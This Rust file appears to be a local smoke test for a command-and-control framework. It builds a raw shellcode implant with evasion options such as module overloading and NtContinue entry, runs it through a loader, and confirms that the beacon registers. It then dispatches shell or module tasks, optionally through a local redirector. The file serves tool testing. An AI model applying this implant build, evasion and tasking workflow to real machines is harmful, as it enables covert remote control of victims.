use axum::body::Bytes;
use axum::extract::State;
use axum::http::{HeaderMap, Method, StatusCode};
use axum::response::{IntoResponse, Response};
use axum::routing::any;
use axum::Router;
use clap::Parser;
use hmac::{Hmac, Mac};
use sha2::Sha256;
use specter_common::proto::specter::v1::{TaskPriority, TaskStatus};
use specter_server::builder::{
    BuilderConfig, ChannelConfig, EvasionFlags, ObfuscationSettings, OutputFormat, PayloadBuilder,
    SleepConfig,
};
use specter_server::db::migrations::run_migrations;
use specter_server::event::EventBus;
use specter_server::listener::{build_router, HttpState, ListenerManager};
use specter_server::module::{ModuleRepository, ModuleType};
use specter_server::profile::compile_listener_config;
use specter_server::profile::schema::Profile;
use specter_server::session::SessionManager;
use specter_server::task::TaskDispatcher;
use sqlx::sqlite::{SqliteConnectOptions, SqlitePoolOptions};
use std::error::Error;
use std::fs::{self, File};
use std::net::TcpListener as StdTcpListener;
use std::path::{Path, PathBuf};
use std::process::Stdio;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tokio::net::TcpListener;
use tokio::process::Command;
use tokio::sync::oneshot;
use x25519_dalek::{PublicKey, StaticSecret};

#[derive(Parser, Debug)]
#[command(
    name = "pic-listener-smoke",
    about = "Build a listener-key-aligned raw PIC payload and prove encrypted /api/beacon registers a session"
)]
struct Cli {
    #[arg(long, default_value = "implant/build/specter.bin")]
    pic: PathBuf,

    #[arg(long, default_value = "implant/build/tests/pic_loader.exe")]
    loader: PathBuf,

    #[arg(long, default_value = "target/local-evidence/pic-listener-smoke.bin")]
    out: PathBuf,

    #[arg(long, default_value = "target/local-evidence/pic-listener-smoke.db")]
    db: PathBuf,

    #[arg(
        long,
        default_value = "target/local-evidence/pic-listener-smoke.loader.log"
    )]
    loader_log: PathBuf,

    #[arg(long, default_value = "127.0.0.1")]
    bind: String,

    #[arg(long)]
    port: Option<u16>,

    #[arg(long, default_value_t = 20_000)]
    timeout_ms: u64,

    #[arg(long)]
    task_command: Option<String>,

    #[arg(long)]
    module_smoke: bool,

    #[arg(long, default_value = "implant/build/modules/template.bin")]
    module_blob: PathBuf,

    #[arg(long, default_value = "template")]
    module_name: String,

    #[arg(long, default_value = "ping")]
    module_args: String,

    #[arg(long, default_value_t = 0)]
    module_dispatch_delay_ms: u64,

    #[arg(long, default_value_t = 70 * 1024)]
    min_result_bytes: usize,

    #[arg(long)]
    legacy_only: bool,

    #[arg(long)]
    profile_mode: bool,

    #[arg(long)]
    redirector_mode: bool,

    #[arg(long, default_value_t = 0)]
    min_profile_checkins: usize,

    #[arg(long, default_value_t = 0)]
    hold_after_register_ms: u64,

    #[arg(long, default_value_t = 0)]
    hold_after_task_complete_ms: u64,

    #[arg(long)]
    loader_protect_rx: bool,

    #[arg(long)]
    loader_split_protect: bool,

    #[arg(long)]
    loader_rw_offset: Option<String>,

    #[arg(long)]
    evasion_module_overload: bool,

    #[arg(long)]
    evasion_pdata_register: bool,

    #[arg(long)]
    evasion_ntcontinue_entry: bool,

    #[arg(long)]
    evasion_module_preserve_headers: bool,

    #[arg(long)]
    evasion_module_patch_only: bool,
}

#[derive(Clone)]
struct LocalRedirectorState {
    upstream_base: String,
    client: reqwest::Client,
    total_requests: Arc<AtomicUsize>,
    profile_requests: Arc<AtomicUsize>,
}

fn test_profile() -> Profile {
    let yaml = r#"
name: "pic-listener-smoke"
description: "Local PIC listener smoke profile"
tls:
  cipher_suites: []
  extensions: []
  curves: []
  alpn: []
http:
  request:
    method: POST
    uri_patterns:
      - /api/profile
    headers: []
    data_embed_points: []
  response:
    status_code: 200
    headers: []
    data_embed_points: []
timing:
  callback_interval: 1
  jitter_percent: 0
transform:
  compress: none
  encrypt: cha_cha20_poly1305
  encode: base64
"#;
    serde_yaml::from_str(yaml).expect("static smoke profile must parse")
}

fn template_dir(pic: &Path) -> PathBuf {
    if pic.is_dir() {
        pic.to_path_buf()
    } else {
        pic.parent().unwrap_or_else(|| Path::new(".")).to_path_buf()
    }
}

fn find_free_port(bind: &str) -> Result<u16, Box<dyn Error>> {
    let socket = StdTcpListener::bind((bind, 0))?;
    Ok(socket.local_addr()?.port())
}

fn derive_profile_session_key(server_secret: &StaticSecret, implant_pubkey: &[u8; 32]) -> [u8; 32] {
    type HmacSha256 = Hmac<Sha256>;

    let implant_pub = PublicKey::from(*implant_pubkey);
    let shared = server_secret.diffie_hellman(&implant_pub);
    let mut mac =
        <HmacSha256 as Mac>::new_from_slice(implant_pubkey).expect("HMAC key length is valid");
    mac.update(shared.as_bytes());
    let prk = mac.finalize().into_bytes();

    let mut mac = <HmacSha256 as Mac>::new_from_slice(&prk).expect("HMAC key length is valid");
    mac.update(b"specter-session");
    mac.update(&[1u8]);
    let okm = mac.finalize().into_bytes();

    let mut out = [0u8; 32];
    out.copy_from_slice(&okm[..32]);
    out
}

fn encode_module_string_args(args: &str) -> Vec<u8> {
    let parts: Vec<&str> = args.split_whitespace().collect();
    let mut out = Vec::new();
    out.extend_from_slice(&(parts.len() as u32).to_le_bytes());
    for part in parts {
        out.extend_from_slice(&0u32.to_le_bytes());
        out.extend_from_slice(&(part.len() as u32 + 1).to_le_bytes());
        out.extend_from_slice(part.as_bytes());
        out.push(0);
    }
    out
}

async fn redirector_handler(
    State(state): State<LocalRedirectorState>,
    method: Method,
    headers: HeaderMap,
    uri: axum::http::Uri,
    body: Bytes,
) -> Response {
    state.total_requests.fetch_add(1, Ordering::SeqCst);
    if uri.path() == "/api/profile" {
        state.profile_requests.fetch_add(1, Ordering::SeqCst);
    }

    let path_and_query = uri
        .path_and_query()
        .map(|pq| pq.as_str())
        .unwrap_or(uri.path());
    let target = format!("{}{}", state.upstream_base, path_and_query);

    let reqwest_method =
        reqwest::Method::from_bytes(method.as_str().as_bytes()).unwrap_or(reqwest::Method::POST);
    let mut request = state.client.request(reqwest_method, target);
    for (name, value) in &headers {
        if name.as_str().eq_ignore_ascii_case("host")
            || name.as_str().eq_ignore_ascii_case("content-length")
        {
            continue;
        }
        request = request.header(name.as_str(), value.as_bytes());
    }

    match request.body(body.to_vec()).send().await {
        Ok(upstream) => {
            let status =
                StatusCode::from_u16(upstream.status().as_u16()).unwrap_or(StatusCode::BAD_GATEWAY);
            let headers = upstream.headers().clone();
            match upstream.bytes().await {
                Ok(bytes) => {
                    let mut response = Response::builder().status(status);
                    for (name, value) in &headers {
                        if name.as_str().eq_ignore_ascii_case("transfer-encoding")
                            || name.as_str().eq_ignore_ascii_case("content-length")
                        {
                            continue;
                        }
                        response = response.header(name.as_str(), value.as_bytes());
                    }
                    response = response.header("Content-Length", bytes.len().to_string());
                    response
                        .body(axum::body::Body::from(bytes))
                        .unwrap_or_else(|_| StatusCode::BAD_GATEWAY.into_response())
                }
                Err(_) => StatusCode::BAD_GATEWAY.into_response(),
            }
        }
        Err(_) => StatusCode::BAD_GATEWAY.into_response(),
    }
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    tracing_subscriber::fmt()
        .with_env_filter(
            tracing_subscriber::EnvFilter::try_from_default_env()
                .unwrap_or_else(|_| "specter_server=info,pic_listener_smoke=info".into()),
        )
        .init();

    let cli = Cli::parse();
    if cli.module_smoke && cli.task_command.is_some() {
        return Err("--module-smoke and --task-command are mutually exclusive".into());
    }
    let expects_task = cli.task_command.is_some() || cli.module_smoke;
    let port = match cli.port {
        Some(port) => port,
        None => find_free_port(&cli.bind)?,
    };
    let redirector_port = if cli.redirector_mode {
        Some(find_free_port(&cli.bind)?)
    } else {
        None
    };

    if let Some(parent) = cli.out.parent() {
        fs::create_dir_all(parent)?;
    }
    if let Some(parent) = cli.db.parent() {
        fs::create_dir_all(parent)?;
    }
    if let Some(parent) = cli.loader_log.parent() {
        fs::create_dir_all(parent)?;
    }

    if cli.db.exists() {
        fs::remove_file(&cli.db)?;
    }

    let pool = SqlitePoolOptions::new()
        .max_connections(4)
        .connect_with(
            SqliteConnectOptions::new()
                .filename(&cli.db)
                .create_if_missing(true),
        )
        .await?;
    run_migrations(&pool).await?;

    let event_bus = Arc::new(EventBus::new(128));
    let session_manager = Arc::new(SessionManager::new(pool.clone(), Arc::clone(&event_bus)));
    let task_dispatcher = Arc::new(TaskDispatcher::new(pool.clone(), Arc::clone(&event_bus)));
    let module_repository = Arc::new(ModuleRepository::new(pool.clone()));
    let smoke_module_id = if cli.module_smoke {
        let blob = fs::read(&cli.module_blob).map_err(|e| {
            format!(
                "failed to read module smoke blob '{}': {e}",
                cli.module_blob.display()
            )
        })?;
        Some(
            module_repository
                .store_module(
                    &cli.module_name,
                    "smoke",
                    ModuleType::Pic,
                    "pic-listener-smoke module",
                    &blob,
                )
                .await?,
        )
    } else {
        None
    };
    let listener_manager = if cli.profile_mode {
        None
    } else {
        Some(ListenerManager::new(
            pool.clone(),
            Arc::clone(&session_manager),
            Arc::clone(&task_dispatcher),
            Arc::clone(&event_bus),
        ))
    };

    let profile = test_profile();
    let (server_secret, server_pubkey, listener_id) =
        if let Some(listener_manager) = listener_manager.as_ref() {
            let listener = listener_manager
                .create_listener("pic-listener-smoke", &cli.bind, port as u32, "http")
                .await?;
            let listener_pubkey = listener_manager
                .get_listener_pubkey(&listener.id)
                .await
                .ok_or("listener public key was not generated")?;
            (None, PublicKey::from(listener_pubkey), Some(listener.id))
        } else {
            let secret = StaticSecret::random_from_rng(rand::thread_rng());
            let pubkey = PublicKey::from(&secret);
            (Some(secret), pubkey, None)
        };

    let builder = PayloadBuilder::new(&BuilderConfig {
        template_dir: template_dir(&cli.pic),
    })?
    .with_module_signing_key(module_repository.signing_pubkey_bytes());
    let callback_port = redirector_port.unwrap_or(port);
    let channel = format!("http://{}:{}/api/beacon", cli.bind, callback_port);
    let evasion_flags = EvasionFlags {
        module_overloading: cli.evasion_module_overload,
        pdata_registration: cli.evasion_pdata_register,
        ntcontinue_entry: cli.evasion_ntcontinue_entry,
        etw_usermode_patch: false,
        module_preserve_headers: cli.evasion_module_preserve_headers,
        module_patch_only: cli.evasion_module_patch_only,
    };

    let result = builder.build_with_evasion_options(
        OutputFormat::RawShellcode,
        &profile,
        &server_pubkey,
        &[ChannelConfig {
            kind: "http".to_string(),
            address: channel.clone(),
        }],
        &SleepConfig {
            interval_secs: 1,
            jitter_percent: 0,
        },
        None,
        evasion_flags,
        true,
        true,
        &ObfuscationSettings {
            string_encryption: false,
            api_hash_randomization: false,
            junk_code_insertion: false,
            junk_density: 0,
            control_flow_flattening: false,
            xor_encryption: false,
        },
        cli.legacy_only,
    )?;

    fs::write(&cli.out, &result.payload)?;
    sqlx::query(
        "INSERT INTO builds (id, implant_pubkey, implant_pubkey_prefix, format, created_at, operator_id) \
         VALUES (?1, ?2, ?3, ?4, ?5, ?6)",
    )
    .bind(&result.build_id)
    .bind(&result.implant_pubkey[..])
    .bind(&result.implant_pubkey[..12])
    .bind(result.format.as_str())
    .bind(chrono::Utc::now().timestamp())
    .bind("pic-listener-smoke")
    .execute(&pool)
    .await?;

    let mut shutdown_tx = None;
    let mut redirector_shutdown_tx = None;
    let redirector_total_requests = Arc::new(AtomicUsize::new(0));
    let redirector_profile_requests = Arc::new(AtomicUsize::new(0));
    if let (Some(listener_manager), Some(listener_id)) = (listener_manager.as_ref(), &listener_id) {
        listener_manager
            .start_listener(listener_id)
            .await
            .map_err(|e| format!("listener start failed: {e}"))?;
    } else {
        let server_secret = server_secret.ok_or("profile mode missing server secret")?;
        let profile_session_key =
            derive_profile_session_key(&server_secret, &result.implant_pubkey);
        let state = HttpState {
            session_manager: Arc::clone(&session_manager),
            task_dispatcher: Arc::clone(&task_dispatcher),
            module_repository: None,
            server_secret: Arc::new(server_secret),
            server_pubkey: Arc::new(server_pubkey),
            listener_profile: Some(Arc::new(compile_listener_config(&profile))),
            profile_session_key: Some(Arc::new(profile_session_key)),
            pool: pool.clone(),
        };
        let app = build_router(state);
        let tcp = TcpListener::bind(format!("{}:{}", cli.bind, port)).await?;
        let (tx, rx) = oneshot::channel::<()>();
        shutdown_tx = Some(tx);
        tokio::spawn(async move {
            if let Err(e) = axum::serve(tcp, app)
                .with_graceful_shutdown(async {
                    let _ = rx.await;
                })
                .await
            {
                tracing::error!("profile smoke listener error: {e}");
            }
        });
    }
    if let Some(redirector_port) = redirector_port {
        let upstream_base = format!("http://{}:{}", cli.bind, port);
        let state = LocalRedirectorState {
            upstream_base,
            client: reqwest::Client::new(),
            total_requests: Arc::clone(&redirector_total_requests),
            profile_requests: Arc::clone(&redirector_profile_requests),
        };
        let app = Router::new()
            .fallback(any(redirector_handler))
            .with_state(state);
        let tcp = TcpListener::bind(format!("{}:{}", cli.bind, redirector_port)).await?;
        let (tx, rx) = oneshot::channel::<()>();
        redirector_shutdown_tx = Some(tx);
        tokio::spawn(async move {
            if let Err(e) = axum::serve(tcp, app)
                .with_graceful_shutdown(async {
                    let _ = rx.await;
                })
                .await
            {
                tracing::error!("local redirector smoke error: {e}");
            }
        });
        println!(
            "PIC listener smoke redirector: http://{}:{} -> http://{}:{}",
            cli.bind, redirector_port, cli.bind, port
        );
    }

    println!("PIC listener smoke channel: {channel}");
    println!(
        "PIC listener smoke payload: {} ({} bytes)",
        cli.out.display(),
        result.payload.len()
    );

    let log = File::create(&cli.loader_log)?;
    let log_err = log.try_clone()?;
    let mut loader_command = Command::new(&cli.loader);
    loader_command
        .arg(&cli.out)
        .arg("--timeout-ms")
        .arg(cli.timeout_ms.to_string());
    if cli.loader_protect_rx {
        loader_command.arg("--protect-rx");
    }
    if cli.loader_split_protect {
        loader_command.arg("--split-protect");
        if let Some(offset) = cli.loader_rw_offset.as_deref() {
            loader_command.arg("--rw-offset").arg(offset);
        }
    }
    let mut child = loader_command
        .stdout(Stdio::from(log))
        .stderr(Stdio::from(log_err))
        .spawn()?;

    let deadline = Instant::now() + Duration::from_millis(cli.timeout_ms);
    let mut passed_session = None;
    let mut queued_task = None;
    let mut completed_task = None;
    let mut completed_at = None;
    let mut loader_exit = None;
    let mut registered_at = None;

    while Instant::now() < deadline {
        if let Some(status) = child.try_wait()? {
            loader_exit = status.code();
            break;
        }

        if passed_session.is_none() {
            let sessions = session_manager.list_sessions().await?;
            if let Some(session) = sessions.first() {
                passed_session = Some(session.id.clone());
                registered_at = Some(Instant::now());
            }
        }

        if let Some(session_id) = passed_session.as_deref() {
            if queued_task.is_none() {
                let dispatch_delay_elapsed = registered_at
                    .map(|at| at.elapsed() >= Duration::from_millis(cli.module_dispatch_delay_ms))
                    .unwrap_or(false);
                if !dispatch_delay_elapsed {
                    tokio::time::sleep(Duration::from_millis(250)).await;
                    continue;
                }

                if let Some(module_id) = smoke_module_id.as_deref() {
                    let mut task_args = module_repository
                        .package_module(module_id, &result.implant_pubkey)
                        .await
                        .map_err(|e| format!("module packaging failed: {e}"))?;
                    let module_args = encode_module_string_args(&cli.module_args);
                    task_args.push(0);
                    task_args.extend_from_slice(&module_args);
                    let task_id = task_dispatcher
                        .queue_task(
                            session_id,
                            "module_load",
                            &task_args,
                            TaskPriority::Normal,
                            "pic-listener-smoke",
                        )
                        .await?;
                    println!("PIC listener smoke queued module task: {task_id}");
                    queued_task = Some(task_id);
                } else if let Some(command) = cli.task_command.as_deref() {
                    let task_id = task_dispatcher
                        .queue_task(
                            session_id,
                            "shell",
                            command.as_bytes(),
                            TaskPriority::Normal,
                            "pic-listener-smoke",
                        )
                        .await?;
                    println!("PIC listener smoke queued task: {task_id}");
                    queued_task = Some(task_id);
                } else {
                    if cli.hold_after_register_ms == 0
                        || registered_at
                            .map(|at| {
                                at.elapsed() >= Duration::from_millis(cli.hold_after_register_ms)
                            })
                            .unwrap_or(false)
                    {
                        let _ = child.kill().await;
                        break;
                    }
                }
            }
        }

        if let Some(task_id) = queued_task.as_deref() {
            if let Some(task) = task_dispatcher.get_task(task_id).await? {
                if task.status == TaskStatus::Complete as i32
                    || task.status == TaskStatus::Failed as i32
                {
                    if completed_task.is_none() {
                        completed_at = Some(Instant::now());
                    }
                    completed_task = Some(task);
                }
            }
        }

        if completed_task.is_some()
            && redirector_profile_requests.load(Ordering::SeqCst) >= cli.min_profile_checkins
            && completed_at
                .map(|at| at.elapsed() >= Duration::from_millis(cli.hold_after_task_complete_ms))
                .unwrap_or(true)
        {
            let _ = child.kill().await;
            break;
        }

        tokio::time::sleep(Duration::from_millis(250)).await;
    }

    if let (Some(listener_manager), Some(listener_id)) = (listener_manager.as_ref(), &listener_id) {
        let _ = listener_manager.stop_listener(listener_id).await;
    }
    if let Some(tx) = shutdown_tx {
        let _ = tx.send(());
    }
    if let Some(tx) = redirector_shutdown_tx {
        let _ = tx.send(());
    }

    if let Some(task) = completed_task {
        if task.status != TaskStatus::Complete as i32 {
            return Err(format!(
                "PIC listener smoke failed: task {} returned non-complete status {}; result_len={}; log={}",
                task.id,
                task.status,
                task.result.len(),
                cli.loader_log.display()
            )
            .into());
        }
        if task.result.len() < cli.min_result_bytes {
            return Err(format!(
                "PIC listener smoke failed: task {} result too small: {} < {}; log={}",
                task.id,
                task.result.len(),
                cli.min_result_bytes,
                cli.loader_log.display()
            )
            .into());
        }
        let profile_checkins = redirector_profile_requests.load(Ordering::SeqCst);
        if profile_checkins < cli.min_profile_checkins {
            return Err(format!(
                "PIC listener smoke failed: only {profile_checkins} profile check-ins observed; required {}; log={}",
                cli.min_profile_checkins,
                cli.loader_log.display()
            )
            .into());
        }

        println!(
            "PIC listener smoke: PASS session_id={} task_id={} result_bytes={} profile_checkins={} redirector_requests={}",
            passed_session.as_deref().unwrap_or("<unknown>"),
            task.id,
            task.result.len(),
            profile_checkins,
            redirector_total_requests.load(Ordering::SeqCst)
        );
        println!("Loader log: {}", cli.loader_log.display());
        return Ok(());
    }

    if !expects_task {
        if let Some(session_id) = passed_session {
            println!("PIC listener smoke: PASS session_id={session_id}");
            println!("Loader log: {}", cli.loader_log.display());
            return Ok(());
        }
    } else if let Some(session_id) = passed_session {
        return Err(format!(
            "PIC listener smoke failed: session {session_id} registered but task did not complete; task_id={:?}; loader_exit={:?}; log={}",
            queued_task,
            loader_exit,
            cli.loader_log.display()
        )
        .into());
    }

    if let Some(session_id) = passed_session {
        println!("PIC listener smoke: PASS session_id={session_id}");
        println!("Loader log: {}", cli.loader_log.display());
        return Ok(());
    }

    if loader_exit.is_none() {
        let _ = child.kill().await;
    }

    Err(format!(
        "PIC listener smoke failed: no session registered; loader_exit={:?}; log={}",
        loader_exit,
        cli.loader_log.display()
    )
    .into())
}
